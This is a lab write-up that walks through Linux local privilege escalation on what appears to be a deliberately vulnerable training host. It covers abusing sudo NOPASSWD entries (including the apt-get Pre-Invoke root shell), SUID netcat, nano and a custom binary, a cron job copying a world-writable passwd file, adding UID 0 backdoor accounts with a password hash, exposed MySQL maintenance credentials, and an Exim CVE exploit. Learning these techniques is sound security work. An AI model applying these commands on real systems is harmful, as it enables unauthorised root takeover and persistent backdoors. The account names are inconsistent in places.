### Sudo Misconfiguration → Privilege Escalation

During enumeration, I checked the sudo permissions for the `muhammad` user:
```bash
sudo -l
```

The output showed:
```text
User muhammad may run the following commands on this host:
    (root) NOPASSWD: /home/muhammad/vuln/2/sudo
    (root) NOPASSWD: /bin/wget
    (root) NOPASSWD: /usr/bin/apt-get
```

This means `muhammad` is explicitly allowed to execute `/home/muhammad/vuln/2/sudo` as `root` without entering a password.

I inspected the binary:
```bash
file /home/muhammad/vuln/2/sudo
ls -l /home/muhammad/vuln/2/sudo
```

The permissions were:
```text
-r-xr-x--t 1 root muhammad 8845 ... /home/muhammad/vuln/2/sudo
```

The binary is **not SUID**. The root privileges come from the `sudoers` configuration.

I then executed the permitted binary through `sudo`:
```bash
sudo /home/muhammad/vuln/2/sudo
```

The command successfully provided elevated privileges.

### Privilege Escalation Chain
```text
muhammad
    │
    │ sudo -l
    ▼
NOPASSWD: /home/muhammad/vuln/2/sudo
    │
    │ sudo executes the binary as root
    ▼
/home/muhammad/vuln/2/sudo
    │
    ▼
Root privileges
```

---

### SUID `nc.traditional` → Privilege Escalation

The binary was configured with the **SUID bit** and owned by `root`:
```bash
ls -l /bin/nc.traditional
```

```text
-rwsrwx--x 1 root root 23808 ... /bin/nc.traditional
```

The `s` in:
```text
-rwsrwx--x
   ^
```

means that `nc.traditional` executes with the **effective privileges of its owner (`root`)**.

This version of Netcat also supports command execution:
```text
-c shell commands
-e filename
```

I started a local Netcat listener:
```bash
/bin/nc.traditional -l -p 4444
```

Then, from another terminal, connected to it and instructed Netcat to execute `whoami`:
```bash
/bin/nc.traditional 127.0.0.1 4444 -c whoami
```

The listener received:
```text
root
```
This demonstrates that the command executed by the SUID `nc.traditional` process inherited **root's effective privileges**.

### Privilege Escalation Chain
```text
muhammad
   │
   │ Execute SUID binary
   ▼
/bin/nc.traditional
   │
   │ SUID → EUID 0
   ▼
-c whoami
   │
   ▼
root
```

**Conclusion:** The SUID configuration of `nc.traditional`, combined with its command-execution functionality, allows a low-privileged user to execute commands with **root privileges**, resulting in a local privilege escalation.

---
### Custom SUID Binary → Privilege Escalation

A custom executable was discovered with the **SUID bit enabled**:
```bash
ls -l /home/muhammad/vuln/1/suid
```
```text
-rwsrwx--x 1 root root 8845 ... /home/muhammad/vuln/1/suid
```

The important part is:
```text
-rwsrwx--x
   ^
   SUID
```

The binary is owned by `root`, so executing it causes the process to run with an **effective UID of 0**.

I executed the binary:
```bash
/home/muhammad/vuln/1/suid
```

It spawned a shell. I then verified the privileges:
```bash
id
```

Output:
```text
uid=1000(muhammad) gid=1000(muhammad) euid=0(root)
```

Although my **real UID** remained `1000 (muhammad)`, the **effective UID was `0 (root)`**.

Running:
```bash
whoami
```

returned:
```text
root
```

### Privilege Escalation Chain
```text
muhammad
   │
   │ Execute SUID binary
   ▼
/home/muhammad/vuln/1/suid
   │
   │ SUID → EUID 0
   ▼
Root shell
```

### Conclusion
The custom `/home/muhammad/vuln/1/suid` executable was a **root-owned SUID binary that spawned a shell with root effective privileges**, allowing the `muhammad` user to escalate from a normal user to **root**.


---

### SUID `nano` → Privilege Escalation → Create UID 0 User

A root-owned `nano` binary was discovered with the SUID bit enabled:
```bash
ls -l /bin/nano
```

```text
-rwsrwx--x 1 root root 167672 ... /bin/nano
```

The SUID bit caused Nano to operate with **effective UID 0**, allowing me to modify files that the `muhammad` user normally could not modify.

I verified that `/etc/passwd` and `/etc/shadow` could be modified through the SUID Nano.

First, I generated a password hash:
```bash
openssl passwd -6 "1234"
```

This produced a SHA-512-crypt hash.

I then used the SUID Nano to add a new account to `/etc/passwd` with **UID 0 and GID 0**:
```text
eyad:x:0:0:eyad:/root:/bin/bash
```

The corresponding password hash was added to `/etc/shadow` under the same username.
```text
eyad:$6$yS.3iGdDuaksG3S5$TwlxG7q6f5wA6xXPm4KaFbf.s0iOAIzm5QgW5FhJSVrG/mw9ElurwWe62FVFrK4NRjIO/fYfEbQqvbl9hLgde/:19000:0:999$
```

After that, I switched to the newly created account:
```bash
su eyad
```

and verified:
```bash
whoami
id
```

The account had:
```text
uid=0(labroot) gid=0(root)
```
### Privilege Escalation Chain
```text
muhammad
   │
   │ Execute SUID nano
   ▼
/bin/nano
   │
   │ EUID 0
   ▼
Modify /etc/passwd + /etc/shadow
   │
   ▼
Create labroot (UID 0)
   │
   ▼
su - labroot
   │
   ▼
root privileges
```
### Conclusion
The SUID `nano` binary provided privileged file-writing capability. By using it to modify the system's account databases and create a **UID 0 account with a known password**, I obtained persistent root-level access.

---

### Scenario: `sudo apt-get` → Root Shell

The sudo configuration allowed:
```text
(root) NOPASSWD: /usr/bin/apt-get
```

I confirmed the permission with:
```bash
sudo -l
```

Because `/usr/bin/apt-get` was explicitly allowed to run as `root`, I used an `apt-get` option  i knew from gtfobins that causes a command to be executed during the update operation:
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

The `/bin/sh` process inherited the privileges of the `apt-get` process, resulting in a root shell.

I then verified the escalation with:
```bash
whoami
id
```
which returned root-level privileges.

### Privilege Escalation Chain
```text
muhammad
    │
    │ sudo -l
    ▼
NOPASSWD: /usr/bin/apt-get
    │
    │ sudo executes apt-get as root
    ▼
apt-get
    │
    │ Pre-Invoke executes /bin/sh
    ▼
/bin/sh
    │
    ▼
root
```


---

### Cron Job + Writable `passwd` File → Privilege Escalation

During enumeration, I inspected the system-wide cron configuration:
```bash
cat /etc/crontab
```

I discovered:
```text
* * * * * root /home/muhammad/vuln/4/script.sh
```

This means the script is executed **every minute as root**.

I then checked the script:
```bash
ls -l /home/muhammad/vuln/4/script.sh
cat /home/muhammad/vuln/4/script.sh
```

The script contained:
```bash
cp /home/muhammad/vuln/4/passwd /etc/passwd
```

Although `script.sh` itself was not writable by `muhammad`, the file being copied was:
```bash
ls -l /home/muhammad/vuln/4/passwd
```

```text
-rw-rw-rw- 1 root root ... /home/muhammad/vuln/4/passwd
```
The `rw-rw-rw-` permissions mean that **any user can modify the file**.

Therefore, the privilege-escalation chain was:
```text
muhammad
    │
    │ Can modify
    ▼
/home/muhammad/vuln/4/passwd
    │
    │ Every minute
    ▼
Root cron job
    │
    │ Executes:
    │ cp /home/muhammad/vuln/4/passwd /etc/passwd
    ▼
/etc/passwd controlled by attacker
    │
    ▼
Modify account database
    │
    ▼
Privileged account / root access
```

For the password, I generated a SHA-512-crypt hash:
```bash
openssl passwd -6 "1234"
```

which produced a hash corresponding to the password `1234`.

 Add a UID-0 account

Open the writable file:
```bash
nano /home/muhammad/vuln/4/passwd
```

Add at the bottom: `eyad:$6$yS.3iGdDuaksG3S5$TwlxG7q6f5wA6xXPm4KaFbf.s0iOAIzm5QgW5FhJSVrG/mw9ElurwWe62FVFrK4NRjIO/fYfEbQqvbl9hLgde/:0:0:eyad:/root:/bin/bash`

### Key Lesson
The vulnerability was **not simply that a cron job existed**. The important combination was:
1. A cron job executes as `root`.
2. The root script uses a file controlled by an unprivileged user.
3. That file is copied directly into `/etc/passwd`.
4. `/etc/passwd` is therefore indirectly controllable by the unprivileged user.
5. on an older Linux system you can add user with its password using `/etc/passwd` only

---
### Scenario — Exposed MySQL Maintenance Credentials

**1. Discover credentials**

The MySQL maintenance credentials were exposed in:
```bash
cat /etc/mysql/debian.cnf
```

Output contained:
```text
user     = debian-sys-maint
password = DVkfHOpjUIumjkvt
```

**2. Authenticate to MySQL**
```bash
mysql -u debian-sys-maint -p
```

Then verify the account:
```sql
SELECT USER(), CURRENT_USER();
```

Output:
```text
debian-sys-maint@localhost
```

**3. Enumerate privileges**
```sql
SHOW GRANTS;
```

The account has:
```text
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD,
SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER,
SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES,
EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT
ON *.* TO 'debian-sys-maint'@'localhost'
WITH GRANT OPTION
```

The important privileges are:
- **`FILE`** → allows MySQL file operations.
- **`SUPER`** → powerful server-level administrative privileges.
- **`WITH GRANT OPTION`** → allows the account to grant privileges to other MySQL accounts.
    

**4. Identify the dangerous configuration**
```bash
ps aux | grep '[m]ysqld'
```

The server was running as:
```text
root ... /usr/sbin/mysqld ... --user=root
```

Therefore:
```text
Exposed /etc/mysql/debian.cnf
        ↓
debian-sys-maint credentials
        ↓
Administrative MySQL access
        ↓
FILE + SUPER + GRANT OPTION
        ↓
mysqld running as root
        ↓
Potential OS-level privilege escalation
```

**Finding:** The combination of **exposed maintenance credentials**, **high MySQL privileges**, and a **MySQL daemon running as root** creates a significant privilege-escalation risk.

---

# SUID/SGID + exim-4.84-3

 we find:
```text
/usr/sbin/exim-4.84-3
```

Now don't immediately exploit it.
Ask:

> **Why is this interesting?**

Because:
1. It is an executable with SUID/SGID privileges.
2. It is a specific, relatively old version of **Exim**.
3. A vulnerability may exist specifically for that version.

###  Research the version
Search for:
```text
Exim 4.84-3 privilege escalation
```
or:
```text
Exim 4.84-3 CVE
```

The relevant vulnerability is **CVE-2016-1531**, which has a local privilege-escalation exploit for affected Exim versions.

In the lab, the exploit is already provided:
```text
/home/user/tools/suid/exim/cve-2016-1531.sh
```

### 4. Execute the exploit
```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

If successful, the exploit gives us a root shell.

The attack chain is:
```text
SUID/SGID enumeration
        ↓
/usr/sbin/exim-4.84-3
        ↓
Identify Exim + version
        ↓
Research CVE-2016-1531
        ↓
Local privilege-escalation exploit
        ↓
Root shell
```

